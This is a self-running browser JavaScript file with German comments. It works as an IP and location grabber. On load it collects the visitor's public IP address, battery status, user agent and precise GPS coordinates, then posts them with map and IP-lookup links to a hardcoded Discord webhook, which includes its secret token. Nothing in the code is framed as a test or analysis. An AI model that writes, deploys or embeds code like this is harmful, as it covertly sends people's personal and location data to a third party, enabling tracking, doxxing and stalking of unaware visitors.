async function sendDataToDiscord() {
    try {
        // IPv4
        const ipv4Response = await fetch('https://api.ipify.org?format=json');
        const ipv4Data = await ipv4Response.json();
        const ipv4Address = ipv4Data.ip;

        // IPv6
        const ipv6Response = await fetch('https://api64.ipify.org?format=json');
        const ipv6Data = await ipv6Response.json();
        const ipv6Address = ipv6Data.ip;

        
        const addressToSend = ipv4Address || ipv6Address;

        // Batteriestat
        let batteryStatus = 'Batteriestatus konnte nicht abgefragt werden';
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            batteryStatus = `Ladezustand: ${Math.round(battery.level * 100)}%, ${battery.charging ? 'Lädt' : 'Nicht ladend'}`;
        }

        // Device-Inf
        const deviceInfo = navigator.userAgent;

        // Geoloc
        let locationInfo = 'Geolocation konnte nicht abgefragt werden';
        let geolocationLink = '';
        if ('geolocation' in navigator) {
            locationInfo = new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords;
                        resolve(`Breitengrad: ${latitude}, Längengrad: ${longitude}`);
                        
                        // Link für die Geolocation
                        geolocationLink = `https://www.koordinaten-umrechner.de/decimal/${latitude},${longitude}?karte=OpenStreetMap&zoom=9`;
                    },
                    (error) => {
                        resolve(`Fehler beim Abrufen der Geolocation: ${error.message}`);
                    }
                );
            });
        }

        locationInfo = await locationInfo;

        const moreInfoLink = `https://whatismyipaddress.com/ip/${ipv4Address}`;

        const message = {
            content: `Die IP-Adresse ist: ${addressToSend}\n` +
                     `Batteriestatus: ${batteryStatus}\n` +
                     `Device-Informationen: ${deviceInfo}\n` +
                     `Geolocation: ${locationInfo}\n` +
                     `Geolocation-Link: [Hier ansehen](${geolocationLink})\n` +
                     `[Mehr Informationen](${moreInfoLink})`
        };

        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1266125230993178710/jAlkmKSYGpKc1ehon3g7aoibKfwsg-Aowu_uUipUambuIXXQ9LFo8bNLR0APME_T4OuO';

        const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        });

        if (!discordResponse.ok) {
            throw new Error(`HTTP-Fehler! Status: ${discordResponse.status}`);
        }

        console.log('Nachricht erfolgreich an Discord gesendet!');
    } catch (error) {
        console.error('Fehler beim Senden der Nachricht:', error);
    }
}

sendDataToDiscord();
